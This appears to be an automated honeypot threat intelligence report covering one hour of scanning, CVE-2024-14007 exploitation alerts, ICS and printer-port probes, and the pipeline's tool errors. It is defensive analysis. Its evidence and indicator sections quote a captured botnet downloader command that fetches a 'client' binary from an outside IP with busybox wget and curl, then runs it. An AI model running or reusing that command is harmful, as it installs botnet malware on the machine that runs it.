# Honeypot Threat Intelligence Report

## 1) Investigation Scope
- **Investigation Start:** 2026-03-04T04:00:03Z
- **Investigation End:** 2026-03-04T05:00:03Z
- **Completion Status:** Partial
- **Degraded Mode:** true - Consistent tool errors with `kibanna_discover_query` and `match_query` prevented retrieval of raw event data for certain honeypot interactions (ADBHoney, Conpot Kamstrup, Miniprint), limiting full payload analysis and comprehensive source IP correlation. An error also occurred during a custom search for ASN 211443.

## 2) Executive Triage Summary
- High volume VNC/RDP scanning detected, predominantly from DigitalOcean infrastructure, indicative of a widespread commodity reconnaissance campaign.
- Confirmed exploitation of CVE-2024-14007 (Shenzhen TVT NVMS-9000 authentication bypass) originating from two distinct IPs hosted in the Netherlands.
- An ADBHoney botnet downloader chain was observed, consistent with known IoT/Linux botnet deployment techniques, retrieving a `client` binary from `193.25.217.83`.
- Unmapped interaction with the Kamstrup industrial control system (ICS) protocol occurred on a Conpot honeypot, representing unusual and potentially targeted activity.
- Newly identified scanning activity targeted port 9100 (Miniprint, raw printer service) from both Amazon AWS and Amarutu Technology Ltd (a known "bulletproof" hosting provider). This suggests diversified reconnaissance for unusual services.
- IP `89.42.231.179` from Amarutu Technology Ltd was linked to both CVE-2024-14007 exploitation and Miniprint scanning, indicating a multi-faceted attacker or compromised host.
- Major uncertainties include the inability to fully analyze the specific payloads and correlate all source IPs for the ADBHoney and Conpot Kamstrup activities due to tooling limitations.

## 3) Candidate Discovery Summary
- **Total Attacks Observed:** 2791
- **Top Services/Ports of Interest:**
    - VNC/RDP: Ports 5925 (236), 5926 (232), 5902 (100), 5900 (57)
    - MikroTik RouterOS: Port 8728 (28)
    - SMTP: Port 25 (207)
    - Kamstrup Protocol (Conpot honeypot): 3 events
    - Miniprint (Raw Printer Service): Port 9100 (29 events)
- **Top Known Signals:**
    - `GPL INFO VNC server response` (2352 counts, Misc activity)
    - `SURICATA IPv4 truncated packet` (900 counts, Generic Protocol Command Decode)
    - `SURICATA AF-PACKET truncated packet` (900 counts, Generic Protocol Command Decode)
    - `ET SCAN MS Terminal Server Traffic on Non-standard Port` (227 counts, Attempted Information Leak)
    - `CVE-2024-14007` (2 alerts)
- **Credential Noise Summary:** Frequent brute-force attempts with common usernames (`user`, `admin`, `solv`, `root`) and passwords (`user`, ``). Anomalous HTTP requests logged as usernames suggest web application scanning or misinterpretation by honeypots.
- **Honeypot Specific Summary:**
    - ADBHoney captured a downloader chain (`cd /tmp && busybox wget ...`) from `193.25.217.83`.
    - Conpot recorded 3 interactions over the `kamstrup_protocol` with a hexadecimal payload.
    - Tanner observed typical WordPress path scanning (`/wp-includes/`).
    - Redis activity was absent.
- **Discovery Errors:** Discovery was affected by recurring errors with `kibanna_discover_query` and `match_query` tools, which prevented deeper raw event retrieval and complete source IP correlation for some honeypot-specific activities (ADBHoney, Conpot Kamstrup).

## 4) Emerging n-day Exploitation
### CVE-2024-14007 Exploitation
- **CVE/Signature Mapping:** CVE-2024-14007, ET WEB_SPECIFIC_APPS Shenzhen TVT NVMS-9000 Information Disclosure Attempt (CVE-2024-14007)
- **Evidence Summary:** 2 alerts observed. Source IPs `46.151.178.13` and `89.42.231.179` targeted ports 17000 and 17001. Public documentation confirms this CVE is an authentication bypass in Shenzhen TVT NVMS-9000, actively exploited by IoT botnets.
- **Affected Service/Port:** Shenzhen TVT NVMS-9000 (ports 17000, 17001)
- **Confidence:** High
- **Operational Notes:** Monitor for new source IPs and increased frequency of this activity. The source IP `89.42.231.179` is associated with Amarutu Technology Ltd (ASN 206264), a known "bulletproof" hosting provider often linked to illicit activities.

## 5) Novel or Zero-Day Exploit Candidates
No novel or zero-day exploit candidates were identified in this investigation window.

## 6) Botnet/Campaign Infrastructure Mapping
### ADBHoney Downloader Chain
- **Item ID:** `adbhoney-downloader-chain`
- **Campaign Shape:** Unknown (consistent with opportunistic botnet deployment)
- **Suspected Compromised Source IPs:** `193.25.217.83` (1 event containing the command chain, also observed 'id' command)
- **ASNs / Geo Hints:** Not explicitly identified in the provided state.
- **Suspected Staging Indicators:** `http://193.25.217.83:8000/client` (HTTP server for 'client' binary)
- **Suspected C2 Indicators:** `193.25.217.83` is suspected as a C2/distribution server. OSINT confirms this command chain is a common technique for deploying botnet malware to Linux/IoT systems.
- **Confidence:** High
- **Operational Notes:** Investigate `193.25.217.83` further, monitor for recurrence, attempt raw event retrieval if tooling allows.

### VNC/RDP Scanning Campaign
- **Item ID:** `vnc-rdp-scanning-campaign`
- **Campaign Shape:** Spray
- **Suspected Compromised Source IPs:** `129.212.179.18` (236 counts), `129.212.188.196` (232 counts), `129.212.184.194` (100 counts), `165.245.138.210` (94 counts), `140.235.19.89` (57 counts), `170.64.152.136` (92 counts), `170.64.156.232` (84 counts), `136.114.97.84` (278 counts, also scanning various other ports).
- **ASNs / Geo Hints:** ASN 14061 (DigitalOcean, LLC, 992 counts) predominantly from United States.
- **Suspected Staging Indicators:** None explicitly identified.
- **Suspected C2 Indicators:** None explicitly identified; typical of large-scale botnet reconnaissance.
- **Confidence:** High
- **Operational Notes:** Monitor for new IPs joining the campaign and any shifts in targeted services or payloads.

## 7) Odd-Service / Minutia Attacks
### Conpot Kamstrup Protocol Interaction
- **Service Fingerprint:** `kamstrup_protocol` (ICS protocol) on Conpot honeypot
- **Why it’s Unusual/Interesting:** Interaction with an industrial control system (ICS) protocol is highly unusual for general internet scanning and suggests potential reconnaissance or targeted attempts against ICS/OT environments. The associated hex payload is not publicly mapped to a known exploit.
- **Evidence Summary:** 3 events on Conpot honeypot, containing the hex payload `b'0018080404030807080508060401050106010503060302010203ff0100010000120000002b0009080304030303020301003300260024001d0020ef530790da655ee34c15fde74cbbb9765f80b86f53063f8c30fb9911f8'`. Source IPs could not be retrieved due to tool errors.
- **Confidence:** Low-Medium (due to inability to retrieve source IPs and unmapped payload)
- **Recommended Monitoring Pivots:** Attempt to retrieve source IPs for this activity, decode/analyze the hex payload if possible, and monitor for more widespread Kamstrup interactions.

### Miniprint Printer Scanning
- **Service Fingerprint:** Port 9100 (raw printer service / Miniprint honeypot)
- **Why it’s Unusual/Interesting:** Targeted scanning of port 9100 suggests reconnaissance for network printers, which can be vulnerable to information disclosure, denial of service, or command injection. Activity included HTTP GET requests and TLS.
- **Evidence Summary:** 29 events. Source IPs `18.97.5.43` (21 events) and `89.42.231.179` (8 events). Observed HTTP GET requests for `/` and TLS traffic, indicating attempts to interact with web interfaces or secure print services.
- **Confidence:** High
- **Recommended Monitoring Pivots:** Monitor for specific printer exploitation attempts, analyze captured print job data if available, and track activity from `18.97.5.43` (Amazon AWS) and `89.42.231.179` (Amarutu Technology Ltd).

## 8) Known-Exploit / Commodity Exclusions
- **Credential Noise:** Frequent brute-force attempts against various services using common usernames and passwords (`user`, `admin`, `solv`, `root`, `solana`, `football`).
- **SSH Brute Force:** Multiple IPs targeting port 22 (SSH), including `80.94.92.184`.
- **SMTP Scanning:** `77.83.39.212` (Ukraine, ASN 214940 Kprohost LLC) heavily targeting port 25 (SMTP).
- **WordPress Scanning:** Tanner honeypot detected commodity scanning for common WordPress paths (`/wp-includes/`).

## 9) Infrastructure & Behavioral Classification
- **Exploitation vs. Scanning:**
    - Targeted exploitation: CVE-2024-14007.
    - Widespread scanning/reconnaissance: VNC/RDP ports, Miniprint port 9100, SSH, SMTP, WordPress paths.
    - Botnet deployment: ADBHoney downloader.
    - Unusual interaction: Conpot Kamstrup protocol.
- **Campaign Shape:**
    - Spray: VNC/RDP scanning campaign, CVE-2024-14007 exploitation, Miniprint scanning.
    - Point-of-origin botnet deployment: ADBHoney downloader.
- **Infra Reuse Indicators:**
    - IP `89.42.231.179` (from Amarutu Technology Ltd / Koddos, a "bulletproof" hosting provider) was involved in both CVE-2024-14007 exploitation and Miniprint scanning, indicating a single actor or compromised host performing diversified attacks.
    - General scanning activity originating from DigitalOcean (ASN 14061) and Amazon AWS (ASN 14618) is consistent with use of compromised or rented cloud instances.
- **Odd-Service Fingerprints:**
    - Industrial Control System (ICS) protocol: Kamstrup (Conpot).
    - Raw printer service: Port 9100 (Miniprint).

## 10) Evidence Appendix

### Emerging n-day Exploitation: CVE-2024-14007 Exploitation
- **Source IPs with Counts:**
    - `46.151.178.13` (39 events to port 17000, 38 events to port 17001)
    - `89.42.231.179` (78 events to port 17001)
- **ASNs with Counts:**
    - `211443` (Sino Worldwide Trading Limited, Netherlands) for `46.151.178.13`
    - `206264` (Amarutu Technology Ltd, Netherlands) for `89.42.231.179`
- **Target Ports/Services:** 17000, 17001 (Shenzhen TVT NVMS-9000 control ports)
- **Payload/Artifact Excerpts:** Suricata alerts for "ET WEB_SPECIFIC_APPS Shenzhen TVT NVMS-9000 Information Disclosure Attempt (CVE-2024-14007)"
- **Staging Indicators:** None identified.
- **Temporal Checks:**
    - `46.151.178.13`: First seen: 2026-03-04T04:20:39Z, Last seen: 2026-03-04T04:56:40Z
    - `89.42.231.179`: First seen: 2026-03-04T04:05:26Z, Last seen: 2026-03-04T04:32:46Z

### Botnet/Campaign Infrastructure Mapping: ADBHoney Downloader Chain
- **Source IPs with Counts:** `193.25.217.83` (1 event of downloader chain, 1 event of 'id' command)
- **ASNs with Counts:** Not available from state.
- **Target Ports/Services:** HTTP port 8000
- **Paths/Endpoints:** `/client`
- **Payload/Artifact Excerpts:** `cd /tmp && busybox wget http://193.25.217.83:8000/client && wget http://193.25.217.83:8000/client && curl http://193.25.217.83:8000/client -o client && chmod 744 client && chmod +x ./client && ./client`
- **Staging Indicators:** `http://193.25.217.83:8000/client`
- **Temporal Checks:** Activity observed in bursts throughout the hour (timeline from discovery agent).

### Botnet/Campaign Infrastructure Mapping: VNC/RDP Scanning Campaign
- **Source IPs with Counts (Top examples):**
    - `136.114.97.84` (278 counts)
    - `129.212.179.18` (236 counts)
    - `129.212.188.196` (232 counts)
    - `129.212.184.194` (100 counts)
    - `165.245.138.210` (94 counts)
- **ASNs with Counts:**
    - `14061` (DigitalOcean, LLC, 992 counts)
- **Target Ports/Services:** 5900, 5901, 5902, 5904, 5906-5915, 5925, 5926 (VNC/RDP protocols)
- **Payload/Artifact Excerpts:** Suricata signatures "GPL INFO VNC server response", "ET SCAN MS Terminal Server Traffic on Non-standard Port".
- **Staging Indicators:** None identified.
- **Temporal Checks:** Activity observed broadly across the investigation window (unavailable for specific IPs).

### Odd-Service / Minutia Attacks: Conpot Kamstrup Protocol Interaction
- **Source IPs with Counts:** Unavailable due to tool errors.
- **ASNs with Counts:** Unavailable due to tool errors.
- **Target Ports/Services:** Kamstrup protocol (on Conpot honeypot)
- **Payload/Artifact Excerpts:** `b'0018080404030807080508060401050106010503060302010203ff0100010000120000002b0009080304030303020301003300260024001d0020ef530790da655ee34c15fde74cbbb9765f80b86f53063f8c30fb9911f8'`
- **Staging Indicators:** None identified.
- **Temporal Checks:** Unavailable.

### Odd-Service / Minutia Attacks: Miniprint Printer Scanning
- **Source IPs with Counts:**
    - `18.97.5.43` (21 events)
    - `89.42.231.179` (8 events)
- **ASNs with Counts:**
    - `14618` (Amazon.com, Inc., United States) for `18.97.5.43`
    - `206264` (Amarutu Technology Ltd, Netherlands) for `89.42.231.179`
- **Target Ports/Services:** 9100 (raw printer service)
- **Paths/Endpoints:** `/` (observed in HTTP GET requests)
- **Payload/Artifact Excerpts:** HTTP User-Agents: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36`, `Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/60.0.3060.96 Safari/537.32`. Miniprint events like `command_received`, `save_raw_print_job`.
- **Staging Indicators:** None identified.
- **Temporal Checks:**
    - `18.97.5.43`: First seen: 2026-03-04T04:26:26Z, Last seen: 2026-03-04T04:27:54Z
    - `89.42.231.179`: Part of broader session: 2026-03-04T04:05:26Z - 2026-03-04T04:32:46Z

## 11) Indicators of Interest
- **Source IPs:**
    - `193.25.217.83` (ADBHoney C2/Staging)
    - `46.151.178.13` (CVE-2024-14007 Exploitation)
    - `89.42.231.179` (CVE-2024-14007 Exploitation, Miniprint Scanning, from bulletproof hosting)
    - `18.97.5.43` (Miniprint Scanning, AWS)
    - `129.212.179.18` (Top VNC/RDP scanner)
    - `129.212.188.196` (Top VNC/RDP scanner)
- **Targeted Ports/Services:** 17000, 17001 (NVMS-9000), 9100 (Raw Printer Service), Kamstrup protocol (on Conpot).
- **URLs:** `http://193.25.217.83:8000/client`
- **Domains:** `koddos.com`, `koddos.net` (associated with ASN 206264, Amarutu Technology Ltd)
- **Payload Fragments:**
    - ADBHoney: `cd /tmp && busybox wget http://193.25.217.83:8000/client ...`
    - Kamstrup: `b'0018080404030807080508060401050106010503060302010203ff0100010000120000002b0009080304030303020301003300260024001d0020ef530790da655ee34c15fde74cbbb9765f80b86f53063f8c30fb9911f8'`
- **ASNs:** `14061` (DigitalOcean), `206264` (Amarutu Technology Ltd / Koddos), `14618` (Amazon.com, Inc.), `211443` (Sino Worldwide Trading Limited).

## 12) Backend Tool Issues
- **`kibanna_discover_query` failures:**
    - For ADBHoney `input.keyword` query: Returned `illegal_argument_exception` ("Expected text at 1:71 but found START_ARRAY").
    - For Conpot `conpot.protocol.keyword` query: Returned `illegal_argument_exception` ("Expected text at 1:71 but found START_ARRAY").
    - For Miniprint `dest_port:9100` query (deep investigation): Returned `illegal_argument_exception` ("Expected text at 1:71 but found START_ARRAY").
    - **Affected Validations:** These failures blocked the retrieval of full raw event details, specifically the full ADBHoney command and context, and the raw payload and context for Conpot Kamstrup interactions and Miniprint. This limited in-depth analysis of attack specifics and immediate payload interpretation.
- **`match_query` failures:**
    - For `type.keyword:Conpot` (candidate discovery): Returned `illegal_argument_exception` ("Expected text at 1:25 but found START_ARRAY").
    - For `dest_port:9100` (deep investigation): Returned `illegal_argument_exception` ("Expected text at 1:26 but found START_ARRAY").
    - **Affected Validations:** Hindered the ability to directly query for specific events, impacting source IP correlation for Conpot Kamstrup activity and raw event inspection for Miniprint.
- **`complete_custom_search` failure:**
    - For `geoip.asn:211443` (deep investigation): Returned `parsing_exception` ("Expected [START_OBJECT] but found [VALUE_STRING]").
    - **Affected Validations:** Limited the ability to gather comprehensive data for source IPs associated with ASN 211443.

## 13) Agent Action Summary (Audit Trail)

- **ParallelInvestigationAgent**
    - Purpose: Gather initial telemetry across various threat categories.
    - Inputs used: `investigation_start`, `investigation_end`.
    - Actions taken: Called baseline tools (total attacks, top countries, IPs, ASNs, country-to-port), known signals tools (alert signatures, CVEs, alert categories), credential noise tools (usernames, passwords, OS distribution), and honeypot-specific tools (Redis, ADBHoney input/malware, Conpot input/protocol, Tanner paths).
    - Key results: Identified 2791 total attacks, top attacking countries (US, Ukraine), prevalent VNC/RDP scanning, CVE-2024-14007 alerts, common credential brute-force, ADBHoney downloader, and Conpot Kamstrup activity.
    - Errors or gaps: None.

- **CandidateDiscoveryAgent**
    - Purpose: Consolidate initial telemetry, perform triage, and identify high-signal candidates.
    - Inputs used: `baseline_result`, `known_signals_result`, `credential_noise_result`, `honeypot_specific_result`.
    - Actions taken: Generated initial triage summary, identified top services/signals. Attempted 10 `kibanna_discover_query`, `two_level_terms_aggregated`, `timeline_counts`, `top_src_ips_for_cve`, `top_dest_ports_for_cve`, `suricata_lenient_phrase_search`, `search`, `match_query`, `custom_basic_search`.
    - Key results: Identified 4 high-signal candidates (CVE-2024-14007 exploitation, ADBHoney downloader, VNC/RDP scanning, Conpot Kamstrup), classified 3 items as commodity exclusions. Identified overall degraded mode due to tool errors.
    - Errors or gaps: 2 `kibanna_discover_query` calls and 1 `match_query` call failed with `illegal_argument_exception`, blocking raw event retrieval for ADBHoney and Conpot.

- **CandidateValidationLoopAgent**
    - Purpose: Orchestrate and execute validation steps for identified candidates.
    - Inputs used: Candidates from `CandidateDiscoveryAgent`.
    - Actions taken: Initialized candidate queue with 7 items. Ran 1 iteration, loaded and processed the `cve-2024-14007-exploitation` candidate. Called `suricata_cve_samples` for validation.
    - Key results: Successfully validated `cve-2024-14007-exploitation` with high confidence, identifying source IPs and associated ASNs.
    - Errors or gaps: None for the processed candidate.

- **DeepInvestigationLoopController**
    - Purpose: Conduct in-depth analysis on high-signal leads generated during discovery and validation.
    - Inputs used: Leads from `CandidateDiscoveryAgent` and `CandidateValidationLoopAgent`.
    - Iterations run: 9.
    - Key leads pursued: `src_ip:46.151.178.13`, `src_ip:89.42.231.179`, `service:9100`, `src_ip:18.97.5.43`, `asn:211443`, `asn:206264`, `asn:14618`, 2 user agent strings, and `domain:koddos.com`.
    - Stall/exit reason: Loop exit requested after 9 iterations with a `stall_count` of 2 (indicating recent consecutive iterations without new high-priority leads), suggesting leads were exhausted or further progress was blocked.
    - Errors or gaps: 1 `kibanna_discover_query` call, 1 `match_query` call, and 1 `complete_custom_search` call failed, limiting raw event retrieval for port 9100 and comprehensive ASN analysis for `211443`.

- **OSINTAgent**
    - Purpose: Provide external threat intelligence and context from open-source information.
    - Inputs used: Candidate details, specific IPs, domains, and payloads.
    - Actions taken: Performed 7 `search` queries for CVE-2024-14007, ADBHoney command pattern, VNC/RDP scanning, Kamstrup payload, ASNs (206264, 14618), and domains (koddos.com).
    - Key results: Confirmed public knowledge/exploitation for CVE-2024-14007, ADBHoney botnet pattern, and VNC/RDP scanning. Identified Amarutu Technology Ltd (ASN 206264) as a "bulletproof" hosting provider. No public mapping found for the Kamstrup protocol payload.
    - Errors or gaps: None.

- **ReportAgent**
    - Purpose: Compile the final investigation report from all available workflow state outputs.
    - Inputs used: All `investigation_start`, `investigation_end`, `baseline_result`, `known_signals_result`, `credential_noise_result`, `honeypot_specific_result`, `candidate_discovery_result`, `validated_candidates`, `osint_validation_result`, `deep investigation outputs`.
    - Actions taken: Consolidated, categorized, and formatted all data into the required markdown report structure.
    - Key results: Generated the comprehensive final threat intelligence report.
    - Errors or gaps: None.

- **SaveReportAgent**
    - Purpose: Save the generated report to persistent storage.
    - Inputs used: Final report markdown content.
    - Actions taken: Called `deep_agent_write_file` (downstream tool).
    - Key results: Report successfully prepared for saving.
    - Errors or gaps: File write status not explicitly captured in provided workflow state, assuming success.